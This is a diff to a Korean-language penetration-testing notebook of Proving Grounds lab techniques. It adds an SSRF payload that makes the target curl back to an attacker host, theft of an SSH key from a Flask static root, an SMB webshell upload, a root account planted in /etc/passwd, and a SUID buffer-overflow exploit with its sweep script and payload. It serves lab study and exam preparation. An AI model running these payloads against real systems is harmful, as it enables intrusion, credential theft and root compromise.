 ⚠️ **검증 함수가 코드베이스에 «있다»는 것과 위험 지점에서 «불린다»는 것은 다름.** 같은 박스의 CVE-2020-11652(경로 트래버설)의 `clean_path()` 는 **취약 버전에도 이미 존재**했으나 `file_roots.py` 가 호출하지 않았음 — 패치는 새 함수를 만든 것이 아니라 **호출을 추가**한 것뿐임.
 → **소스를 읽을 때 「방어 코드가 있는가」가 아니라 「sink 직전에 «실제로» 불리는가」를 볼 것.** 함수 정의만 보고 안전하다고 판단하면 취약점을 통째로 놓침.
 
+#### B-1-53. Flask 정적 서버의 루트가 홈 디렉터리다 — `static_folder` 를 소스에서 확인한다
+
+- **어디서 보이는가** — Werkzeug 배너가 뜬 포트에서 루트는 404 인데 `robots.txt` 는 응답
+
+```text
+User-agent: *
+Disallow: /.bashrc
+Disallow: /.profile
+Disallow: /taxes
+```
+출처: `~/PG/Covfefe/web-31337/probe_robots.txt`
+
+- **판정 기준** — 애플리케이션 자산이 아니라 **셸 설정 점 파일**이 URL 경로로 나열되면 정적 서빙 루트가 사용자 홈. 앱 디렉터리를 서빙하는 서버에 `.bashrc` 가 놓일 자리 부재
+- **원인 패턴** — 소스 확보 후 확인할 두 줄
+
+```python
+root = environ['HOME']
+
+app = Flask(__name__, static_folder=root, static_url_path='')
+```
+출처: `~/PG/Covfefe/read_message_src.txt`(`/home/simon/http_server.py` 발췌, `import`·라우트 정의 생략)
+
+- `static_url_path=''` 가 URL 이름공간 전체를 그 디렉터리에 매핑
+- `environ['HOME']` 은 **프로세스를 띄운 계정의 홈**. 계정 특정은 `ps auxf` — [[Covfefe]] 는 `simon 415 … /bin/sh -c /home/simon/http_server.py`
+- **먼저 긁을 것** — 디렉터리 목록을 기다리지 말고 표준 경로부터 때릴 것
+  - `/.ssh/id_rsa` · `/.ssh/id_rsa.pub` · `/.ssh/authorized_keys`
+  - `/.bash_history` · `/.bashrc` · `/.profile`
+  - `/local.txt` · `/user.txt` — 홈에 있으면 그대로 열림. 단 웹으로 읽은 플래그는 시험 0점이라 셸 확보 후 원위치 `cat` 필요
+  - 읽을 대상 일반론은 B-1-27
+- **실측** — `/.ssh/id_rsa`(1,766 B)를 목록 열람 없이 첫 배치에서 확보. 패스프레이즈는 `ssh2john` + rockyou 로 1초 미만 크랙
+
+#### B-1-54. blind 요청은 «콜백»으로 읽고, Content-Type × 파라미터명을 «한 판»에 쏜다
+
+**상황** — SSRF 로 대상 스스로 브라우저를 띄우게 만들어 루프백 전용 엔드포인트에 닿았으나, 응답을 읽을 수단이 없음. 소스도 아직 손에 없어 파라미터 이름조차 모름.
+
+[[AdminPanel]] 실측. `/exec` 는 `req.connection.remoteAddress` 가 루프백일 때만 통과하고, 통과하면 `exec(command)` 를 무필터 실행함. Kali 에서 직접 POST 하면 `{"error":"Access denied"}`(`/tmp/e.out`). 반면 `/open-url` 이 띄우는 헤드리스 크로미움은 대상 자신에서 도므로 게이트를 그대로 통과함 — 앞의 B-15 가 말하는 「출발지 IP 를 바꿔줄 중간 홉」의 SSRF 판본임.
+
+**문제는 그다음** — 브라우저 안에서 쏜 요청은 동일출처가 아니라 응답을 못 읽음. 그래서 **성공 여부를 응답이 아니라 아웃오브밴드 콜백으로 판정함.** 페이로드마다 고유 토큰을 박아 공격자 HTTP 서버로 `curl` 을 되쏘게 하면, 도착한 토큰이 곧 「그 조합이 통했다」는 증거임.
+
+```js
+// 공격자 페이지 — 기법 5종 × 파라미터명 8종을 한 번에
+var L="http://<LHOST>", T="http://127.0.0.1:3000/exec";
+var keys=["cmd","command","c","exec","run","shell","input","code"];
+function ubody(t){return keys.map(function(k){
+  return k+"="+encodeURIComponent("curl -s "+L+"/HIT-"+t+"-"+k);}).join("&");}
+// A: fetch no-cors + text/plain + JSON 본문
+// B: fetch no-cors + urlencoded            ← 단순 요청
+// C: form enctype=text/plain 로 JSON 밀수
+// D: form enctype=urlencoded               ← 단순 요청
+// E: fetch cors + application/json         ← 프리플라이트 발생
+fetch(T,{method:"POST",mode:"no-cors",
+  headers:{"Content-Type":"application/x-www-form-urlencoded"},body:ubody("B")});
+```
+— 출처: `/tmp/apwww/x.html`(1,815 B)
+
+**왜 B·D 만 도달하는가** — 대상이 `bodyParser.json()` 과 `bodyParser.urlencoded()` 를 둘 다 붙였을 때:
+| 기법 | Content-Type | 결과 | 사유 |
+|---|---|---|---|
+| A · C | `text/plain` | 실패 | 두 파서 중 어느 쪽도 파싱하지 않아 `req.body` 가 빔 |
+| **B · D** | `application/x-www-form-urlencoded` | **도달** | **단순 요청이라 프리플라이트 자체가 없음.** 응답을 못 읽어도 서버는 이미 실행함 |
+| E | `application/json` | 실패 | 프리플라이트 `OPTIONS` 가 나가는데 CORS 헤더 부재로 본 요청이 안 감 |
+
+→ **`application/json` 만 상정한 CSRF 방어는 `urlencoded` 파서를 함께 켜는 순간 무너짐.** 「JSON API 라서 CSRF 가 안 된다」는 통념의 반례임.
+
+**규율 셋:**
+- **소스가 없으면 파라미터 이름을 «맞히지» 말고 전부 실어 보낼 것.** 한 요청에 8개 키를 다 넣으면 왕복이 1회로 끝남(A-2-19 · B-1-11 의 배치 원칙)
+- **콜백 토큰에 «기법»과 «키»를 둘 다 인코딩할 것**(`HIT-<기법>-<키>`). 어느 조합이 통했는지를 도착 URL 하나로 판정함
+- ⚠️ **리스너 로그를 즉시 파일로 떨어뜨릴 것.** [[AdminPanel]] 은 콜백을 tmux 페인으로만 봤고 그 세션이 사라져 **어느 토큰이 도착했는지의 원문이 미보존**임. 페이로드(`x.html`)는 남았는데 결과가 없어, 위 표를 소스 연역으로 되세워야 했음(A-31 · B-83)
+
+**부수 소득 — SSRF 응답 문자열이 내부 포트 스캔임.** 헤드리스 브라우저의 오류 문자열이 그대로 판정 근거가 됨:
+```text
+http://127.0.0.1:631/admin/      >>> net::ERR_INVALID_AUTH_CREDENTIALS   ← 열려 있고 인증 요구
+http://127.0.0.1:9222/json/...   >>> net::ERR_CONNECTION_REFUSED         ← 닫힘
+```
+— 출처: `~/PG/AdminPanel/openurl/b_11.json`·`b_12.json`
+
+⚠️ **스킴 필터는 정규식 원문을 볼 것.** `/^https?:\/\//` 는 대소문자를 가리므로 `HTTP://…` 가 `Invalid or missing URL` 로 거부됨(`b_10.json`). `file:`·`about:`·`data:`·`javascript:`·`view-source:`·`ftp:` 도 같은 자리에서 전량 차단 — **puppeteer 에 닿기 전에 걸리므로 「브라우저가 막았다」로 오독하지 말 것.**
+
 ### B-2. 네트워크 서비스
 
 #### B-21. ProFTPd + mod_sql_mysql — 계정이 DB 행 하나다
@@ -6060,7 +6187,17 @@ RDB 앞뒤에 헤더/푸터 바이트가 붙어 결과 파일은 **RDB 껍데기
 - `[가정]` 저권한이어도 `config set dir` 로 쓸 수 있는 root 소유 경로(예: root cron 이 처리하는 웹루트)가 있으면 우회 가능
 - `authorized_keys` 경로 / cron.d 경로가 막히는 사유는 A-2-10
 
-**방어(`rename-command`)** — `CONFIG` · `MODULE` · `SLAVEOF` 셋 중 하나만 지워도 이 경로 전체가 닫힘.
+**방어(`rename-command`)** — 커맨드마다 닫는 범위가 다르므로 하나로 갈음하지 말 것.
+
+| 비우는 커맨드 | 닫히는 것 | 남는 것 |
+|---|---|---|
+| `MODULE` | **모듈 RCE 경로 전체.** `.so` 를 적재할 수단이 사라짐 | cron·`authorized_keys` 같은 파일 기록 경로 |
+| `CONFIG` | `dir`·`dbfilename` 임의 지정 — cron.d·웹루트 기록 | **복제 경로.** 기본값 경로가 쓰기 가능하면 적재가 성립 |
+| `SLAVEOF`(`REPLICAOF`) | rogue master 로부터의 페이로드 전달 | 파일을 다른 경로로 올릴 수 있으면 `MODULE LOAD` 는 그대로 |
+
+**필수 단계는 `MODULE LOAD` 하나**이므로 모듈 RCE 만 놓고 보면 `MODULE` 차단이 결정적임. 다만 Redis 전체 공격면은 그보다 넓으므로 셋을 함께 비우고 인증(`requirepass`)·바인드 주소 제한을 같이 걸 것.
+
+⚠️ 종전 판은 「셋 중 하나만 지워도 경로 전체가 닫힘」으로 적혔으나 틀림 — `CONFIG` 만 비우면 복제 경로가 살아있음. 이 표는 동작 구조에서 도출한 것이고 랩 재현 검증은 미수행.
 
 **출처** — [[Wombo]](Redis 5.0.9 소스 컴파일본, `system.exec` → uid=0).
 
@@ -6098,6 +6235,42 @@ smbclient //<타겟>/share$ -N      # recurse ON; ls
 `index.html`·`robots.txt`·`wordpress/` 가 그대로 노출 → `wp-config.php` 에서 DB 자격증명 회수. 그 자격증명의 원격 MySQL 접속이 막히는 이유는 A-24(에러 1130).
 
 → **`WRITE` 가 보이면 저장소가 아니라 «자격증명 덫»으로 쓸 것** — 미끼 파일 투하 + Responder 로 NetNTLMv2 를 걷는 경로가 B-57 임. 이 카드는 «익명 읽기» 공유가 웹루트인지를 보는 쪽이고 둘은 다른 수임.
+
+**쓰기 가능 여부를 자동 도구 판정으로 결론짓지 말 것** ([[SunsetTwilight]])
+
+- **오탐 실측** — `smbmap` 널 세션이 공유를 `READ ONLY` 로 판정
+
+```text
+	WRKSHARE                                          	READ ONLY	Workplace Share. Do not access if not an employee.
+	print$                                            	NO ACCESS	Printer Drivers
+```
+출처: `~/PG/SunsetTwilight/svc/smbmap-null.txt`
+
+- **실제** — `smbclient` 로 `put` 하면 성공. 같은 공유가 파일시스템 루트(`/`) 매핑이라 `\tmp\` · `\var\www\html\` 양쪽에 기록 가능
+
+```text
+=== write to /var/www/html test ===
+putting file /tmp/t.php as \var\www\html\t.php (0.1 kB/s) (average 0.1 kB/s)
+```
+출처: `~/PG/SunsetTwilight/enum4.txt`(306~307행. `\tmp\wtest.txt` 판은 `enum3.txt` 72~74행)
+
+- **판정 기준** — 공유 권한은 **실제 `put` 결과로만 확정.** 도구의 `READ ONLY` 를 쓰기 불가 근거로 쓰면 웹셸 업로드 벡터가 통째로 소실됨(자동 판정 일반론은 A-11)
+- ⚠️ **디렉터리 퍼미션과도 어긋날 수 있음** — 같은 박스의 `/var/www/html` 은 `drwsr-xr-x`(other 쓰기 부재)인데도 익명 `put` 이 성립. Samba 측 계정 매핑이 파일시스템 모드를 앞섬. **`ls -la` 만 보고 쓰기 불가로 접지 말 것**
+- **공유 루트가 `/` 인지 보는 법** — 공유 안에서 `\tmp\`·`\home\`·`\var\` 가 열거되면 루트 매핑. 특정 경로의 `NT_STATUS_ACCESS_DENIED`(이 박스는 `\home\miguel`·`\root`·`\etc\shadow`)는 매핑 범위가 아니라 파일 퍼미션 문제
+- **읽기가 먼저 주는 것** — `\var\www\html\` 소스 전량. 웹을 두드리기 전에 소스에서 취약점을 찾을 것(B-1-21)
+
+```php
+<?php
+
+$lang = $_GET['lang'];
+
+include('./' . $lang);
+
+?>
+```
+출처: `~/PG/SunsetTwilight/srcloot/lang.php`(SMB 로 회수한 원본)
+
+- 필터 부재 `include` — LFI/RFI 확정. 소스 없이 파라미터를 때렸으면 같은 결론에 왕복 다수 소요
 
 #### B-28. `enum4linux -U` 가 비면 `rpcclient` 로 `S-1-22-1-<uid>` 를 역조회한다
 
@@ -7144,6 +7317,88 @@ perl -e 'print crypt("<pw>","ab")'        perl 은 거의 항상 있으나 salt 
 ⚠️ **`python3 -c 'import crypt'` 원라이너는 최신 Kali 에서 그냥 죽음** — 오래된 치트시트가 이 형태를 싣고 있어 시험장에서 시간을 태우기 쉬움. 실측: Python 3.13.12 에서 `ModuleNotFoundError: No module named 'crypt'`.
 
 `/etc/passwd` 에 UID 0 계정을 심는 절차 자체는 [[Access]]·[[Flu]]·[[Clue]]·[[Twiggy]] 공통임 — **UID 필드를 0 으로, 비밀번호 필드에 해시를 직접 기입**(그러면 shadow 를 참조하지 않음). 덮어쓰기 전 원본을 먼저 읽어야 하는 이유는 B-1-48.
+
+**world-writable `/etc/passwd` 를 만났을 때의 전 경로** ([[SunsetTwilight]])
+
+- **발견** — `find -writable` 스코프 스캔에서 `/etc/passwd` 가 쓰기 가능. `harvest.sh` 의 WRITABLE 절은 시스템 설정 파일을 스코프에서 빠뜨릴 수 있으므로 **`/etc/passwd` 는 이름으로 직접 `ls -l` 할 것**
+- **심을 행** — `pwn:<해시>:0:0:root:/root:/bin/bash`. UID·GID 가 0 이면 계정 이름 무관
+- **최대 함정 — 해시의 `$` 가 셸에서 소실.** `$1$`·`$6$` 는 쌍따옴표 안에서 셸 변수로 확장되어 빈 문자열로 치환
+
+```text
+www-data@twilight:/var/www/html$ echo "pwn:$1$tw$WPDGDCRz4U4wAtsevbkDE.:0:0:root:/root:/bin/bash" >> /etc/passwd; tail -2 /etc/passwd
+mysql:x:108:118:MySQL Server,,,:/nonexistent:/bin/false
+pwn:.:0:0:root:/root:/bin/bash
+```
+출처: `~/PG/SunsetTwilight/shell443b.log`(233~235행)
+
+- **해시 필드가 `.` 한 글자로 남은 것이 소실의 표식.** 웹셸 → `bash` 처럼 셸을 겹쳐 통과시키면 확장이 중첩되어 홑따옴표만으로는 불충분
+- **해결** — Kali 에서 `openssl passwd -6` 로 만든 문자열을 `base64 -w0` 로 감싸 전송하고 타겟에서 `base64 -d` 로 복원. 전송 경로에 셸이 몇 겹이든 무손실
+- **검증 한 줄** — 추가 직후 `tail -2 /etc/passwd` 로 **해시 필드를 눈으로 확인할 것.** 이것 없이는 `su` 실패의 원인이 해시인지 비밀번호인지 판정 불가
+- ⚠️ **파손 행이 남아 있어도 `su` 가 성공할 수 있음 — 성공을 그 행의 근거로 삼지 말 것.** 같은 박스에서 위 `pwn:.` 바로 다음 줄의 `su pwn` 이 root 를 내줬는데, `.` 로는 인증이 성립하지 않음(Kali 실측 `perl -e 'print crypt("pass123",".")'` → `*0`). **`getpwnam()` 이 파일 위에서부터 첫 일치를 쓰므로**, 앞서 들어간 유효 행이 이겼고 뒤에 붙은 파손 행은 무시된 것임. `/etc/shadow` 판 first-match 는 B-37
+  - → **여러 번 시도했으면 «어느 행이 실제로 먹혔는지» 확정할 것.** 안 하면 통하지 않은 명령을 성공 절차로 노트에 남기게 됨
+- **마무리는 대화형 pty 에서** — 웹셸의 `su` 는 tty 부재로 불성립(A-3-10)
+
+```text
+www-data@twilight:/var/www/html$ su pwn
+Password: 
+root@twilight:/var/www/html# id; whoami; hostname; hostname -I; date; cat /root/proof.txt
+uid=0(root) gid=0(root) groups=0(root)
+```
+출처: `~/PG/SunsetTwilight/shell443b.log`(240~243행 발췌, 이후 플래그 4행 생략)
+
+#### B-3-18. SUID 바이너리의 인접 스택 변수를 덮어 실행 경로를 바꾼다 — 셸코드·ROP 불요
+
+- **적용 조건 셋** — 전부 성립해야 이 경로. 하나라도 어긋나면 통상 BOF
+  1. 고정 크기 버퍼에 길이 검증 부재(`gets`·`strcpy`)
+  2. 같은 프레임에 **실행 대상 경로 문자열** 변수 존재(`execve`·`system` 의 인자)
+  3. 그 변수가 버퍼보다 «뒤» 배치
+- **판정 기준** — 리턴 주소를 건드릴 이유 부재. 덮을 대상이 이미 「무엇을 실행할지」를 쥐고 있어 문자열 하나를 `/bin/sh` 로 바꾸면 종료. ASLR·NX·스택 카나리 전부 무관
+
+```c
+    char program[] = "/usr/local/sbin/message";
+    char buf[20];
+    char authorized[] = "Simon";
+
+    printf("What is your name?\n");
+    gets(buf);
+
+    // Only compare first five chars to save precious cycles:
+    if (!strncmp(authorized, buf, 5)) {
+        printf("Hello %s! Here is your message:\n\n", buf);
+        // This is safe as the user can't mess with the binary location:
+        execve(program, NULL, NULL);
+```
+출처: `~/PG/Covfefe/read_message_src.txt`(`/root/read_message.c` 의 `main` 본문 발췌, `#include`·`else` 절 생략)
+
+- **관문 우회** — `strncmp(authorized, buf, 5)` 는 앞 5바이트만 검사. 접두만 맞추면 뒤는 자유
+- **오프셋은 계산하지 말고 스윕할 것** — 선언 순서와 실제 스택 배치는 컴파일러 소관
+
+```bash
+for n in $(seq 8 1 64); do
+  echo "=== offset $n ==="
+  { python3 -c "import sys;sys.stdout.buffer.write(b'Simon'+b'A'*($n-5)+b'/bin/sh'+b'\x00'+b'\n')"; echo "id;echo MARKER_\$n"; } | /usr/local/bin/read_message 2>&1 | grep -a -E "uid=|MARKER_|Segmentation|Sorry|No such|not found" | head -4
+done
+```
+출처: `~/PG/Covfefe/sweep.sh`(`#!/bin/bash`·`cd /tmp` 2행 생략)
+
+```text
+=== offset 20 ===
+uid=1000(simon) gid=1000(simon) euid=0(root) groups=1000(simon),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+MARKER_
+```
+출처: `~/PG/Covfefe/bof_offset_sweep.txt`(오프셋 8~64 중 20 구간 발췌)
+
+- **성립 지점** — 오프셋 20 하나. 페이로드는 `Simon` + `A`×15 + `/bin/sh` + NUL = 28바이트
+- **셸을 살리는 한 수** — 페이로드만 파이프하면 `execve` 로 뜬 `/bin/sh` 가 즉시 EOF 로 종료. 페이로드 뒤에 stdin 을 이어 붙일 것
+
+```bash
+python3 -c "import sys;sys.stdout.buffer.write(b'Simon'+b'A'*15+b'/bin/sh'+b'\x00\n')" > /tmp/pl.bin
+cat /tmp/pl.bin /dev/stdin | /usr/local/bin/read_message
+```
+출처: `~/PG/Covfefe/root.sh`(`#!/bin/bash`·`cd /tmp` 2행 생략)
+
+- **함정** — `printf 'Simon%.0sA' {1..15}` 는 `SimonASimonA…` 출력으로 페이로드 파손. `printf 'Simon'; printf 'A%.0s' {1..15}; printf '/bin/sh\0'` 로 나눠 쓸 것
+- **euid 만 0 인 상태 고정** — 스윕 출력은 `uid=1000 … euid=0`. `python3 -c "import os,pty;os.setreuid(0,0);os.setregid(0,0);pty.spawn('/bin/bash')"` 로 실uid 까지 0 으로 올릴 것(SUID 셸의 euid 소실 일반론은 B-33)
 
 ### B-4. 윈도우 권한상승
 
@@ -9187,6 +9442,8 @@ cd ~/PG/<박스> && chromium --headless --no-sandbox --disable-gpu --hide-scroll
 file x.png && identify -format '%wx%h %k colors\n' x.png
 ```
 **가장 확실한 것은 그냥 여는 것임.**
+
+**⛔ `view-source:` 는 헤드리스로 캡처되지 않음 — 주석·숨은 마크업의 증거는 `curl` 로 남길 것.** [[JISCTF]] 실측: `--screenshot=... view-source:http://…/admin_area/` 가 소스가 아니라 **빈 새 탭(검색창)**을 찍었고, 종료 코드는 정상이라 파이프라인에서는 성공으로 보였음. 그 PNG 는 증거에서 폐기함. **HTML 주석 안의 값은 화면이 아니라 응답 본문에만 존재하므로 캡처 대상이 애초에 아님** — 스크린샷은 «렌더된 화면»용이고, 주석 증거는 `curl -s <URL> > resp.html` 로 원문을 남길 것(A-1).
 → 위험은 두 겹임 — ⓐ「캡처가 됐으니 서비스가 살아 있다」는 **잘못된 확정 사실이 노트에 박히고 뒤의 판단이 그 위에 쌓임** ⓑ **OSCP 에서 스크린샷은 증거이므로 오류 페이지를 제출하면 그 플래그가 인정 안 됨**(E 절).
 ⚠️ [[Muddy]] 노트가 「정찰 캡처 4장이 전부 `ERR_ADDRESS_UNREACHABLE` 이었다」고 적었으나 **그 실물이 남아 있지 않음** — `~/PG/Muddy/` 에 `.png` 가 0개이고 볼트 `파일보관\` 의 Muddy 스크린샷 2장은 직접 열어본 결과 **정상 렌더 화면**(Ladon 카탈로그·WordPress 홈)임. **그 사례는 근거부족**이고, 기법 자체(헤드리스는 오류도 성공으로 저장함)만 일반 지식으로 유효함.
 
